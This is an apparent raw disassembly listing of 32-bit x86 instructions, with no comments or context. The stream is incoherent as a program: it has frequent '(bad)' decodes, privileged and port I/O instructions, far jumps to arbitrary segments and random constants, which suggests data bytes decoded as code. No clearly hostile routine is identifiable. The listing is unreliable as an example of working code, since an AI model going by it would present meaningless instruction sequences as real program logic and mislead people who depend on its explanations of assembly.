  41c926:	xor    DWORD PTR ds:[eax+esi*4-0x60],edx
  41c92b:	jmp    0x41c978
  41c92d:	sub    ebx,DWORD PTR [esi]
  41c92f:	xchg   edx,eax
  41c930:	imul   edx,DWORD PTR [edx+0x1ebedbaa],0x23
  41c937:	mov    DWORD PTR [edx+0x1cab955d],ebp
  41c93d:	in     eax,dx
  41c93e:	fcmovnu st,st(6)
  41c940:	mov    al,0x40
  41c942:	lahf   
  41c943:	retf   
  41c944:	stos   BYTE PTR es:[edi],al
  41c945:	jl     0x41c947
  41c947:	dec    ebp
  41c948:	daa    
  41c949:	nop
  41c94a:	mov    edx,0xd448c7f8
  41c94f:	je     0x41c9cf
  41c951:	in     eax,0x22
  41c953:	pop    es
  41c954:	std    
  41c955:	or     edx,DWORD PTR [edi]
  41c957:	cli    
  41c958:	fld    TBYTE PTR [edx+0x3b86d24e]
  41c95e:	cmp    DWORD PTR [edx+0x1],0xffffff82
  41c962:	loopne 0x41c8e7
  41c964:	inc    esi
  41c965:	mov    esi,0xcc90f53c
  41c96a:	mov    al,ds:0x3fb36b78
  41c96f:	aaa    
  41c970:	stc    
  41c971:	pop    ecx
  41c972:	or     eax,0x20ed13f0
  41c977:	stos   DWORD PTR es:[edi],eax
  41c978:	fadd   DWORD PTR [ecx+0x53e36f0a]
  41c97e:	ss push edx
  41c980:	int    0xd4
  41c982:	mov    ch,0xbe
  41c984:	sbb    ecx,0x50
  41c987:	fbstp  TBYTE PTR [edi]
  41c989:	arpl   si,di
  41c98b:	int3   
  41c98c:	hlt    
  41c98d:	xor    al,0xe0
  41c98f:	test   al,0xb9
  41c991:	xchg   esi,eax
  41c992:	mov    esp,0xc62df570
  41c997:	mov    al,0xfe
  41c999:	xchg   edi,eax
  41c99a:	cld    
  41c99b:	scas   al,BYTE PTR es:[edi]
  41c99c:	jp     0x41c97f
  41c99e:	pop    es
  41c99f:	scas   eax,DWORD PTR es:[edi]
  41c9a0:	pop    ebx
  41c9a1:	xchg   DWORD PTR [esp+eax*1-0x54c4241e],ebp
  41c9a8:	ins    BYTE PTR es:[edi],dx
  41c9a9:	adc    DWORD PTR [esi+eiz*4-0x1dda6327],ecx
  41c9b0:	arpl   ax,sp
  41c9b2:	and    dh,BYTE PTR [esi+0x10333102]
  41c9b8:	(bad)  
  41c9ba:	lods   al,BYTE PTR ds:[esi]
  41c9bb:	ret    0x3c94
  41c9be:	pop    eax
  41c9bf:	sbb    DWORD PTR [ebp-0xf],edx
  41c9c2:	cmp    eax,0xacf84e4d
  41c9c7:	cmp    bl,dl
  41c9c9:	mov    ebp,0xf7b0e7d0
  41c9ce:	mov    al,0x99
  41c9d0:	(bad)  
  41c9d1:	dec    esi
  41c9d2:	fsubr  DWORD PTR [ebx-0x31]
  41c9d5:	inc    esi
  41c9d6:	loope  0x41ca01
  41c9d8:	inc    ebp
  41c9d9:	adc    cl,bl
  41c9db:	je     0x41c9c9
  41c9dd:	dec    esp
  41c9de:	push   ecx
  41c9df:	popa   
  41c9e0:	adc    eax,0xca311a05
  41c9e5:	scas   eax,DWORD PTR es:[edi]
  41c9e6:	inc    ebx
  41c9e7:	xlat   BYTE PTR ds:[ebx]
  41c9e8:	adc    ecx,DWORD PTR fs:[eax+0x13]
  41c9ec:	imul   edx,DWORD PTR [edx+0x31],0xffffff9f
  41c9f0:	out    0xaa,eax
  41c9f2:	push   ss
  41c9f3:	and    DWORD PTR [edi+eax*4-0xa],esp
  41c9f7:	and    cl,BYTE PTR [esi]
  41c9f9:	mov    DWORD PTR ds:0x34ebea00,edx
  41c9ff:	js     0x41ca70
  41ca01:	jge    0x41c9c5
  41ca03:	pop    ds
  41ca04:	clc    
  41ca05:	bound  eax,QWORD PTR [edi]
  41ca07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca08:	fnstsw WORD PTR [esi+esi*4-0x7b5e0249]
  41ca0f:	sbb    dh,BYTE PTR [ebx+0x4c9a35a2]
  41ca15:	mov    edx,0xf6dfc2ac
  41ca1a:	xchg   esi,eax
  41ca1b:	stos   BYTE PTR es:[edi],al
  41ca1c:	mov    eax,ds:0xe2c4f2c6
  41ca21:	mov    esi,0xbfd59f64
  41ca26:	mov    BYTE PTR [eax+0x38c60603],dl
  41ca2c:	inc    ebx
  41ca2d:	dec    ebp
  41ca2e:	mov    BYTE PTR [ebx+0x12eb41d],al
  41ca34:	outs   dx,BYTE PTR ds:[esi]
  41ca35:	aam    0x36
  41ca37:	call   0x28119039
  41ca3c:	add    al,0x4
  41ca3e:	jmp    0x5781327d
  41ca43:	jp     0x41c9c6
  41ca45:	cld    
  41ca46:	loop   0x41ca05
  41ca48:	xchg   edx,eax
  41ca49:	jmp    0x41ca36
  41ca4b:	jb     0x41c9cd
  41ca4d:	sub    DWORD PTR [ecx+eax*1-0x1e3e5012],0x2064ccb1
  41ca58:	in     eax,0xdd
  41ca5a:	pop    edi
  41ca5b:	daa    
  41ca5c:	in     al,dx
  41ca5d:	ins    DWORD PTR es:[edi],dx
  41ca5e:	nop
  41ca5f:	lock cmp BYTE PTR [edx],dh
  41ca62:	jge    0x41cadf
  41ca64:	popf   
  41ca65:	or     al,0x39
  41ca67:	sub    DWORD PTR [eax+eax*8],0xaf9c58de
  41ca6e:	lock dec edi
  41ca70:	push   cs
  41ca71:	xchg   DWORD PTR [ecx],ebp
  41ca73:	ror    DWORD PTR [edx],cl
  41ca75:	fstp   TBYTE PTR [eax+eiz*8]
  41ca78:	into   
  41ca79:	jb     0x41ca28
  41ca7b:	or     al,0x6
  41ca7d:	push   edx
  41ca7e:	gs jbe 0x41ca0e
  41ca81:	push   ecx
  41ca82:	or     al,0x8c
  41ca84:	pop    ss
  41ca85:	dec    esp
  41ca86:	or     bh,dh
  41ca88:	lods   al,BYTE PTR ds:[esi]
  41ca89:	ins    DWORD PTR es:[edi],dx
  41ca8a:	std    
  41ca8b:	iret   
  41ca8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca8d:	pop    ebx
  41ca8e:	int    0x89
  41ca90:	popf   
  41ca91:	mov    ah,0x1
  41ca93:	clc    
  41ca94:	arpl   ax,ax
  41ca96:	xor    eax,0x82de8793
  41ca9b:	ret    
  41ca9c:	(bad)  
  41ca9d:	cmp    al,dh
  41ca9f:	rcr    cl,1
  41caa1:	mov    eax,0x221c97a0
  41caa6:	lods   al,BYTE PTR ds:[esi]
  41caa7:	jns    0x41cabe
  41caa9:	scas   al,BYTE PTR es:[edi]
  41caaa:	push   edx
  41caab:	out    dx,al
  41caac:	gs xor eax,0x95a5a4d9
  41cab2:	aas    
  41cab3:	mov    edi,0x7b97cd02
  41cab8:	lods   eax,DWORD PTR ds:[esi]
  41cab9:	sub    al,0x17
  41cabb:	test   DWORD PTR [esi-0x29],0xeb6528e0
  41cac2:	xchg   edi,eax
  41cac3:	mov    dh,0x8a
  41cac5:	xlat   BYTE PTR ds:[ebx]
  41cac6:	pushf  
  41cac7:	stos   BYTE PTR es:[edi],al
  41cac8:	das    
  41cac9:	dec    ecx
  41caca:	sahf   
  41cacb:	pop    ecx
  41cacc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cacd:	outs   dx,DWORD PTR ds:[esi]
  41cace:	ja     0x41ca88
  41cad0:	repz push eax
  41cad2:	pusha  
  41cad3:	push   0x7b
  41cad5:	(bad)  
  41cad6:	shl    DWORD PTR [ecx],1
  41cad8:	jno    0x41ca90
  41cada:	ret    0xe2b0
  41cadd:	and    DWORD PTR [edx+ebx*1],edx
  41cae0:	pop    ds
  41cae1:	popa   
  41cae2:	test   eax,0x118c0b43
  41cae7:	(bad)  
  41cae9:	ds push ebx
  41caeb:	mov    ebx,DWORD PTR [edx-0x4c]
  41caee:	xchg   edx,eax
  41caef:	sub    al,0x21
  41caf1:	cdq    
  41caf2:	in     eax,0xdf
  41caf4:	jb     0x41cb20
  41caf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf7:	push   0x3e45dd01
  41cafc:	pop    edx
  41cafd:	inc    esp
  41cafe:	inc    esp
  41caff:	push   eax
  41cb00:	push   0x691f1faa
  41cb05:	pop    esp
  41cb06:	xchg   ebx,eax
  41cb07:	cmp    edi,ebx
  41cb09:	pop    ebp
  41cb0a:	jae    0x41caca
  41cb0c:	push   ecx
  41cb0d:	xchg   esi,eax
  41cb0e:	dec    ebp
  41cb0f:	pop    edi
  41cb10:	dec    ebp
  41cb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb12:	ins    BYTE PTR es:[edi],dx
  41cb13:	jmp    0x99984147
  41cb18:	cmc    
  41cb19:	and    dl,BYTE PTR [ebx+eax*2]
  41cb1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb1d:	fistp  QWORD PTR [ebp+0x3322cc10]
  41cb23:	pop    ss
  41cb24:	clc    
  41cb25:	jecxz  0x41cb92
  41cb27:	repnz or eax,0xef5aa8a8
  41cb2d:	(bad)  
  41cb2f:	jne    0x41cab6
  41cb31:	sbb    al,0x11
  41cb33:	sub    BYTE PTR [edx],0xc0
  41cb36:	push   esi
  41cb37:	idiv   BYTE PTR [ebp+esi*2-0x49eda4a0]
  41cb3e:	jp     0x41cba1
  41cb40:	mov    cl,0x6e
  41cb42:	mov    esi,0xa9c32a0
  41cb47:	out    dx,al
  41cb48:	push   eax
  41cb49:	call   0xc0c5:0x3ef34720
  41cb50:	daa    
  41cb51:	bound  ebx,QWORD PTR [ecx]
  41cb53:	ja     0x41cb25
  41cb55:	ds and al,0xfd
  41cb58:	xlat   BYTE PTR ds:[ebx]
  41cb59:	adc    DWORD PTR [ebp-0x73f2d369],edx
  41cb5f:	inc    ecx
  41cb60:	test   eax,0x8ef10308
  41cb65:	hlt    
  41cb66:	mov    eax,0x75d328af
  41cb6b:	add    DWORD PTR [ecx],eax
  41cb6d:	cwde   
  41cb6e:	jmp    DWORD PTR [esi]
  41cb70:	retf   
  41cb71:	mov    ds:0xd4441e6a,eax
  41cb76:	sbb    BYTE PTR [edi],bh
  41cb78:	dec    ecx
  41cb79:	xchg   ecx,eax
  41cb7a:	sub    dh,dh
  41cb7c:	out    dx,eax
  41cb7d:	int3   
  41cb7e:	sbb    esi,DWORD PTR [edx+0x2d]
  41cb81:	fstp   QWORD PTR [eax]
  41cb83:	pop    ss
  41cb84:	lods   eax,DWORD PTR ds:[esi]
  41cb85:	out    dx,eax
  41cb86:	and    esp,ebp
  41cb88:	icebp  
  41cb89:	or     DWORD PTR [eax+0x5d],ebx
  41cb8c:	cmp    esi,eax
  41cb8e:	sbb    esi,esp
  41cb90:	fadd   QWORD PTR [ecx+0x7b]
  41cb93:	xor    DWORD PTR ds:0xc25a3831,ebp
  41cb99:	scas   al,BYTE PTR es:[edi]
  41cb9a:	ja     0x41cbf7
  41cb9c:	mov    ch,BYTE PTR [ebp+0x46ffff25]
  41cba2:	cmp    dh,BYTE PTR [ecx-0x24]
  41cba5:	push   es
  41cba6:	push   ss
  41cba7:	sbb    DWORD PTR [esi+ebx*1],edx
  41cbaa:	dec    ebp
  41cbab:	mov    eax,ds:0x98f1ebac
  41cbb0:	fcomp  QWORD PTR [edx+0x6d6b7815]
  41cbb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbb7:	push   ebx
  41cbb8:	loopne 0x41cb44
  41cbba:	(bad)  
  41cbbc:	(bad)  
  41cbbd:	ficom  DWORD PTR [ecx]
  41cbbf:	in     al,0x20
  41cbc1:	imul   edi,DWORD PTR [edx],0x4a
  41cbc4:	xchg   edx,eax
  41cbc5:	scas   al,BYTE PTR es:[edi]
  41cbc6:	jg     0x41cc0f
  41cbc8:	mov    ch,0xf8
  41cbca:	sbb    eax,0x85f9a670
  41cbcf:	dec    ebx
  41cbd0:	inc    edx
  41cbd1:	sahf   
  41cbd2:	sbb    eax,0x7f5b9a6b
  41cbd7:	adc    DWORD PTR [ebx],eax
  41cbd9:	test   ebx,eax
  41cbdb:	sbb    al,0x54
  41cbdd:	sbb    ah,BYTE PTR [esi+0x4bbec468]
  41cbe3:	cs retf 
  41cbe5:	cdq    
  41cbe6:	jno    0x41cb6a
  41cbe8:	pop    ebx
  41cbe9:	jns    0x41cbbc
  41cbeb:	in     eax,dx
  41cbec:	jl     0x41cbee
  41cbee:	jp     0x41cc35
  41cbf0:	xchg   ebp,eax
  41cbf1:	add    ch,dl
  41cbf3:	cmp    ah,dh
  41cbf5:	jecxz  0x41cc1c
  41cbf7:	sub    dl,0x4c
  41cbfa:	std    
  41cbfb:	jge    0x41cbc0
  41cbfd:	aas    
  41cbfe:	adc    esi,esi
  41cc00:	test   al,0xa
  41cc02:	jbe    0x41cc19
  41cc04:	aaa    
  41cc05:	pop    eax
  41cc06:	mov    esp,DWORD PTR [ebp-0x102c210d]
  41cc0c:	push   0x8eabe49
  41cc11:	repnz push ds
  41cc13:	aaa    
  41cc14:	jl     0x41cc1e
  41cc16:	push   ebp
  41cc17:	jle    0x41cc27
  41cc19:	cwde   
  41cc1a:	sub    ebx,DWORD PTR [edi+0x1e31fd5]
  41cc20:	and    al,0x8f
  41cc22:	and    eax,0x55dda37b
  41cc27:	xor    al,0xdd
  41cc29:	cs xchg ebp,eax
  41cc2b:	out    0xf2,al
  41cc2d:	pop    DWORD PTR [eax+0x362412f6]
  41cc33:	cmp    edx,eax
  41cc35:	arpl   WORD PTR [edx+0x6a],bp
  41cc38:	inc    ebp
  41cc39:	mov    bl,0xad
  41cc3b:	leave  
  41cc3c:	inc    edx
  41cc3d:	ja     0x41cc29
  41cc3f:	cmp    esp,ebp
  41cc41:	and    esi,edi
  41cc43:	jbe    0x41cc6c
  41cc45:	push   ss
  41cc46:	dec    eax
  41cc47:	fidivr WORD PTR [eax]
  41cc49:	mov    ds:0x97fa4108,al
  41cc4e:	jnp    0x41cc1e
  41cc50:	mov    eax,ds:0xef2144c9
  41cc55:	xchg   ebx,eax
  41cc56:	mov    edx,0xa4fcb8d7
  41cc5b:	out    0xf8,al
  41cc5d:	mov    bh,0x2f
  41cc5f:	push   edx
  41cc60:	loopne 0x41cc03
  41cc62:	xchg   ecx,eax
  41cc63:	xor    ecx,0x0
  41cc66:	lds    ecx,FWORD PTR [edi-0x56]
  41cc69:	sub    ch,ah
  41cc6b:	lods   al,BYTE PTR ds:[esi]
  41cc6c:	je     0x41cce6
  41cc6e:	xor    al,0x73
  41cc70:	repz sub BYTE PTR [edx-0x7ee01e0b],ch
  41cc77:	shr    BYTE PTR [edi-0x77],1
  41cc7a:	or     dl,BYTE PTR [edx-0x3c]
  41cc7d:	or     dh,dl
  41cc7f:	sbb    eax,0x4473ef5f
  41cc84:	ss es adc al,0x3d
  41cc88:	daa    
  41cc89:	call   0xc4aaa3ef
  41cc8e:	push   edi
  41cc8f:	xchg   ebp,eax
  41cc90:	inc    edx
  41cc91:	std    
  41cc92:	push   cs
  41cc93:	mov    ebx,0x9d4a4b78
  41cc98:	aas    
  41cc99:	stos   BYTE PTR es:[edi],al
  41cc9a:	xchg   ecx,eax
  41cc9b:	xchg   esi,eax
  41cc9c:	mov    bl,0x14
  41cc9e:	rol    ch,0xef
  41cca1:	pop    ss
  41cca2:	icebp  
  41cca3:	mov    edx,0xc0e66894
  41cca8:	xchg   esi,eax
  41cca9:	sbb    eax,0xfbd590ff
  41ccae:	pop    ss
  41ccaf:	adc    esp,DWORD PTR [ebx]
  41ccb1:	rcr    edx,cl
  41ccb3:	(bad)  
  41ccb4:	inc    DWORD PTR [eax]
  41ccb6:	clc    
  41ccb7:	loope  0x41ccca
  41ccb9:	sbb    eax,0x8ca0f4fd
  41ccbe:	xor    edx,DWORD PTR [ebp-0x7d]
  41ccc1:	inc    edx
  41ccc2:	inc    ecx
  41ccc3:	jb     0x41cc8d
  41ccc5:	inc    ebp
  41ccc6:	mov    dl,ah
  41ccc8:	mov    ah,0xde
  41ccca:	(bad)  
  41cccb:	out    0x83,eax
  41cccd:	aam    0xa6
  41cccf:	lods   al,BYTE PTR ds:[esi]
  41ccd0:	jmp    0x5c59:0x3ae7c282
  41ccd7:	inc    esp
  41ccd8:	xchg   esi,eax
  41ccd9:	jne    0x41ccad
  41ccdb:	pushf  
  41ccdc:	mov    ds:0x3a8af505,al
  41cce1:	sbb    eax,0x63647dcb
  41cce6:	add    DWORD PTR [eax+0x6d71d16b],0x4da5c514
  41ccf0:	xchg   ecx,eax
  41ccf1:	mov    dl,0x22
  41ccf3:	call   0x1d98:0x509d0d41
  41ccfa:	or     eax,0xd1cd886c
  41ccff:	outs   dx,BYTE PTR ds:[esi]
  41cd00:	(bad)  
  41cd01:	(bad)  
  41cd03:	jnp    0x41cd24
  41cd05:	inc    edi
  41cd06:	test   al,0x5f
  41cd08:	test   al,0x74
  41cd0a:	jmp    0x31b3:0xc1b13ef6
  41cd11:	fmul   DWORD PTR [ebx]
  41cd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd14:	cmp    ecx,DWORD PTR [eax+0x3d40f03f]
  41cd1a:	pextrw eax,(bad),0xc5
  41cd1c:	add    al,0xa2
  41cd1e:	or     DWORD PTR [ecx],ebx
  41cd20:	or     eax,0x94092a18
  41cd25:	cld    
  41cd26:	rol    BYTE PTR [ecx-0x4ffc0426],cl
  41cd2c:	bound  edi,QWORD PTR [edi]
  41cd2e:	stos   BYTE PTR es:[edi],al
  41cd2f:	mov    esi,0xeea7a6e4
  41cd34:	dec    ebp
  41cd35:	cmp    DWORD PTR [ebp+0x43],esi
  41cd38:	cwde   
  41cd39:	inc    edx
  41cd3a:	es leave 
  41cd3c:	cmp    ch,dl
  41cd3e:	cwde   
  41cd3f:	ins    DWORD PTR es:[edi],dx
  41cd40:	int    0xd8
  41cd42:	add    ecx,DWORD PTR [ebx-0x66]
  41cd45:	xchg   DWORD PTR [edx-0x27],ebx
  41cd48:	xor    BYTE PTR [edi+0x22980505],ch
  41cd4e:	dec    esp
  41cd4f:	es pop ds
  41cd51:	sti    
  41cd52:	call   0xd40f:0x81be863
  41cd59:	mov    fs,WORD PTR [ebx]
  41cd5b:	hlt    
  41cd5c:	mov    ds:0x32aa70c6,eax
  41cd61:	rcr    DWORD PTR [ebp+esi*4-0x7d],cl
  41cd65:	sbb    al,0xd9
  41cd67:	mov    ebx,ds
  41cd69:	push   ds
  41cd6a:	hlt    
  41cd6b:	pop    ds
  41cd6c:	pop    esp
  41cd6d:	sub    bh,dl
  41cd6f:	mov    WORD PTR [edi+0x1],fs
  41cd72:	dec    ebx
  41cd73:	xchg   ebp,eax
  41cd74:	and    edx,ebx
  41cd76:	mov    eax,ds:0xf6014e96
  41cd7b:	es pop esp
  41cd7d:	clc    
  41cd7e:	inc    esp
  41cd7f:	popf   
  41cd80:	and    al,0xb9
  41cd82:	mov    eax,0xbdd46a83
  41cd87:	add    al,0x2
  41cd89:	stos   BYTE PTR es:[edi],al
  41cd8a:	fdiv   QWORD PTR [ebx+0x34d987dc]
  41cd90:	loop   0x41cd17
  41cd92:	test   DWORD PTR [edx+eiz*8-0x68f514f3],ebx
  41cd99:	xor    edi,DWORD PTR ds:0xd0692d19
  41cd9f:	xor    BYTE PTR [eax],0xbb
  41cda2:	ja     0x41cd51
  41cda4:	fimul  DWORD PTR [ebx-0x6a]
  41cda7:	outs   dx,BYTE PTR ds:[esi]
  41cda8:	pop    DWORD PTR [edi+0xf]
  41cdab:	fmul   DWORD PTR [ebp+0x1529437d]
  41cdb1:	sti    
  41cdb2:	sub    ecx,edx
  41cdb4:	push   ecx
  41cdb5:	outs   dx,BYTE PTR ds:[esi]
  41cdb6:	mov    edx,0x659d1807
  41cdbb:	mov    bl,0xd2
  41cdbd:	pop    eax
  41cdbe:	aad    0xd3
  41cdc0:	daa    
  41cdc1:	rcl    ch,cl
  41cdc3:	(bad)  [eax-0x33]
  41cdc6:	das    
  41cdc7:	inc    DWORD PTR [eax-0x5f]
  41cdca:	pop    edi
  41cdcb:	mov    ah,0x67
  41cdcd:	(bad)  
  41cdce:	jecxz  0x41ce07
  41cdd0:	cwde   
  41cdd1:	push   eax
  41cdd2:	or     eax,0x7986d9ff
  41cdd7:	in     al,dx
  41cdd8:	loop   0x41cd8f
  41cdda:	aam    0x4d
  41cddc:	sub    cl,al
  41cdde:	or     ebx,DWORD PTR [edx+0xa]
  41cde1:	xchg   esp,eax
  41cde2:	or     DWORD PTR [esi+0x2c9cd4bd],ebp
  41cde8:	xchg   esp,eax
  41cde9:	fadd   DWORD PTR [esi+edx*1]
  41cdec:	xchg   al,ch
  41cdee:	pop    ecx
  41cdef:	mov    edi,0x3f20323
  41cdf4:	sub    BYTE PTR [ecx+0x4],al
  41cdf7:	or     ch,BYTE PTR [eax-0x7e9df52b]
  41cdfd:	add    al,0xf5
  41cdff:	xchg   ecx,eax
  41ce00:	jp     0x41ce01
  41ce02:	mov    al,0x8e
  41ce04:	sti    
  41ce05:	pusha  
  41ce06:	cli    
  41ce07:	xor    esp,edi
  41ce09:	jb     0x41cdd3
  41ce0b:	mov    cr5,esi
  41ce0e:	(bad)  
  41ce0f:	(bad)  
  41ce11:	(bad)  
  41ce12:	adc    DWORD PTR [ebx+0x25],esp
  41ce15:	loop   0x41ce95
  41ce17:	adc    DWORD PTR [esi-0x6037846f],esi
  41ce1d:	arpl   WORD PTR [edx-0x30],cx
  41ce20:	push   cs
  41ce21:	dec    edi
  41ce22:	ins    DWORD PTR es:[edi],dx
  41ce23:	jg     0x41ce54
  41ce25:	inc    ebp
  41ce26:	loopne 0x41cdc3
  41ce28:	sti    
  41ce29:	std    
  41ce2a:	pusha  
  41ce2b:	outs   dx,BYTE PTR ds:[esi]
  41ce2c:	popa   
  41ce2d:	cwde   
  41ce2e:	jmp    0xf1a5:0xba2c9ab8
  41ce35:	jecxz  0x41ce3e
  41ce37:	loopne 0x41cdeb
  41ce39:	ss gs mov ecx,0xeceb26d7
  41ce40:	and    al,BYTE PTR [edi-0x23]
  41ce43:	mov    ah,0x1e
  41ce45:	fist   WORD PTR [ebp-0xe]
  41ce48:	mov    bl,0xc5
  41ce4a:	dec    esp
  41ce4b:	adc    bl,BYTE PTR [edx+0x354ae3ca]
  41ce51:	sbb    ah,ah
  41ce53:	in     al,0x27
  41ce55:	push   ss
  41ce56:	or     eax,0x1c29201d
  41ce5b:	shl    BYTE PTR ds:[edx+edx*8],1
  41ce5f:	stc    
  41ce60:	fmul   DWORD PTR [ebx+0x35582268]
  41ce66:	adc    bl,BYTE PTR [eax-0x7c4dec08]
  41ce6c:	ret    
  41ce6d:	mov    eax,0x58e1d417
  41ce72:	mov    edi,0x5ba2dc75
  41ce77:	cmp    DWORD PTR gs:[ecx+0x62],edx
  41ce7b:	sar    edx,1
  41ce7d:	push   0x67
  41ce7f:	(bad)  
  41ce80:	je     0x41ce52
  41ce82:	jge    0x41cef1
  41ce84:	cmp    DWORD PTR [ebp-0x13],ebx
  41ce87:	push   0xffffffbf
  41ce89:	loop   0x41ce0c
  41ce8b:	cdq    
  41ce8c:	sahf   
  41ce8d:	sub    bl,dh
  41ce8f:	nop
  41ce90:	dec    esp
  41ce91:	lea    ebp,[esi+0x188b445]
  41ce97:	inc    edx
  41ce98:	test   BYTE PTR [ecx],al
  41ce9a:	lods   al,BYTE PTR ds:[esi]
  41ce9b:	pop    es
  41ce9c:	push   ds
  41ce9d:	mov    ebp,0xcbf5ea0b
  41cea2:	dec    ebp
  41cea3:	inc    ebx
  41cea4:	lds    eax,FWORD PTR [eax-0xb7d887f]
  41ceaa:	leave  
  41ceab:	xor    esp,DWORD PTR [ebp+0x3f]
  41ceae:	xor    bl,BYTE PTR [ecx]
  41ceb0:	scas   eax,DWORD PTR es:[edi]
  41ceb1:	xchg   esi,eax
  41ceb2:	sbb    bh,ah
  41ceb4:	pop    ebx
  41ceb5:	mov    esi,0x71d21538
  41ceba:	mov    edi,0x1dfe5c2f
  41cebf:	cmp    cl,BYTE PTR [edi]
  41cec1:	jns    0x41ce58
  41cec3:	pop    ecx
  41cec4:	cmp    eax,0xfd6ba208
  41cec9:	adc    DWORD PTR [esi+0x482d1c6b],ecx
  41cecf:	cwde   
  41ced0:	sub    DWORD PTR [ecx+0x59236d93],ebx
  41ced6:	in     al,dx
  41ced7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ced8:	in     al,0xa9
  41ceda:	call   DWORD PTR [esi-0x4]
  41cedd:	push   eax
  41cede:	add    BYTE PTR [ebp+esi*1+0x2a],bh
  41cee2:	xor    BYTE PTR [eax],cl
  41cee4:	int    0x3c
  41cee6:	loopne 0x41cecf
  41cee8:	cmp    al,BYTE PTR [esi+ebx*1+0x11]
  41ceec:	repnz test al,0xb7
  41ceef:	shl    cl,cl
  41cef1:	int3   
  41cef2:	mov    ebp,0xe8f2756e
  41cef7:	les    ebx,FWORD PTR [edi]
  41cef9:	xchg   esi,eax
  41cefa:	gs mov bh,0x9f
  41cefd:	inc    edi
  41cefe:	rcl    DWORD PTR [esi],0xdb
  41cf01:	or     eax,0x4a3374d5
  41cf06:	vpmacsdql xmm6,xmm3,XMMWORD PTR [ecx+r8d*4],xmm2
  41cf0d:	mov    BYTE PTR [esi+0x6030694f],al
  41cf13:	cmp    ebx,esi
  41cf15:	test   DWORD PTR es:[eax-0x340ab799],0x3e9eed28
  41cf20:	or     esp,ebp
  41cf22:	push   es
  41cf23:	push   esp
  41cf24:	jb     0x41cf27
  41cf26:	inc    esp
  41cf27:	adc    ebx,edi
  41cf29:	push   0x3d
  41cf2b:	cs sbb al,0xbc
  41cf2e:	mov    al,BYTE PTR [edi-0x2f]
  41cf31:	inc    ecx
  41cf32:	loop   0x41cefd
  41cf34:	xor    ebx,DWORD PTR [edx]
  41cf36:	inc    ecx
  41cf37:	dec    edi
  41cf38:	(bad)  
  41cf3a:	sti    
  41cf3b:	loopne 0x41cf0a
  41cf3d:	adc    BYTE PTR [eax+0x3303999e],al
  41cf43:	int    0x82
  41cf45:	sub    al,0x49
  41cf47:	pusha  
  41cf48:	adc    DWORD PTR ds:0x341dbd66,ecx
  41cf4e:	sbb    BYTE PTR [edx+edi*2-0x13c6de6b],ah
  41cf55:	sti    
  41cf56:	ret    
  41cf57:	pop    esp
  41cf58:	(bad)  
  41cf59:	mov    eax,ds:0xdbdce855
  41cf5e:	les    edx,FWORD PTR [edi]
  41cf60:	sbb    eax,0x5cb5d005
  41cf65:	sahf   
  41cf66:	mov    esp,0x2c1d35ee
  41cf6b:	aas    
  41cf6c:	cmc    
  41cf6d:	mov    ecx,0xe2a1b53
  41cf72:	int    0x18
  41cf74:	dec    ebx
  41cf75:	jp     0x41cf4a
  41cf77:	mov    ch,0xe0
  41cf79:	daa    
  41cf7a:	sub    BYTE PTR [edx-0x5f90eac],cl
  41cf80:	les    ebp,FWORD PTR [edi-0x50]
  41cf83:	pop    ecx
  41cf84:	mov    ch,0x5d
  41cf86:	push   ds
  41cf87:	sbb    DWORD PTR [ebx-0x547c714c],ecx
  41cf8d:	mov    cl,0x25
  41cf8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf90:	xchg   dl,ch
  41cf92:	sub    ecx,edi
  41cf94:	(bad)  
  41cf95:	retf   
  41cf96:	rcl    BYTE PTR gs:[eax],1
  41cf99:	jnp    0x41cf44
  41cf9b:	fsub   QWORD PTR [edi+esi*8]
  41cf9e:	jmp    0x41cf88
  41cfa0:	cmp    cl,BYTE PTR [eax]
  41cfa2:	mov    edi,0x3e7572a9
  41cfa7:	and    BYTE PTR [esi-0x3586ae42],cl
  41cfad:	jbe    0x41cf36
  41cfaf:	(bad)  
  41cfb0:	push   ebp
  41cfb1:	call   FWORD PTR [edx+0x25]
  41cfb4:	test   ah,dl
  41cfb6:	xchg   edx,eax
  41cfb7:	and    ebx,esi
  41cfb9:	and    bl,bh
  41cfbb:	cwde   
  41cfbc:	pushf  
  41cfbd:	ret    0x9692
  41cfc0:	pop    edx
  41cfc1:	xchg   edi,eax
  41cfc2:	push   es
  41cfc3:	jge    0x41d011
  41cfc5:	fst    DWORD PTR [eax+0x62d589d8]
  41cfcb:	jle    0x41cfeb
  41cfcd:	adc    DWORD PTR [edx-0x62],esi
  41cfd0:	shl    edi,0x36
  41cfd3:	cwde   
  41cfd4:	dec    esi
  41cfd5:	stc    
  41cfd6:	mov    ebp,0xa7d4991e
  41cfdb:	adc    ecx,ebx
  41cfdd:	cmp    dh,BYTE PTR [edi]
  41cfdf:	(bad)  
  41cfe0:	jecxz  0x41cf9e
  41cfe2:	ds adc al,0x99
  41cfe5:	mov    ecx,0x42783fe3
  41cfea:	(bad)  
  41cfec:	adc    al,0xa
  41cfee:	jbe    0x41cf94
  41cff0:	xchg   edx,eax
  41cff1:	es aam 0x19
  41cff4:	fwait
  41cff5:	push   ebp
  41cff6:	and    dh,BYTE PTR [eax]
  41cff8:	ret    0xdb74
  41cffb:	(bad)  
  41cffd:	jne    0x41d064
  41cfff:	fcmovb st,st(4)
  41d001:	dec    di
  41d003:	mov    esp,0xc5016a1d
  41d008:	mov    ecx,0x8efddafd
  41d00d:	or     eax,0xc2fbbaa4
  41d012:	pop    ebp
  41d013:	imul   ebp,DWORD PTR [edi+0x4c],0x82c747ed
  41d01a:	mov    ax,0x994c
  41d01e:	in     al,0x6c
  41d020:	xchg   ch,dl
  41d022:	cmp    BYTE PTR [edx+0x5c656f2],0x92
  41d029:	iret   
  41d02a:	icebp  
  41d02b:	dec    ebx
  41d02c:	inc    ecx
  41d02d:	mov    ch,0xfc
  41d02f:	lea    esp,[esi]
  41d031:	cmp    al,BYTE PTR ds:[ebp*4-0x608f9afd]
  41d039:	xchg   BYTE PTR [esi+0x37],ah
  41d03c:	popa   
  41d03d:	dec    ecx
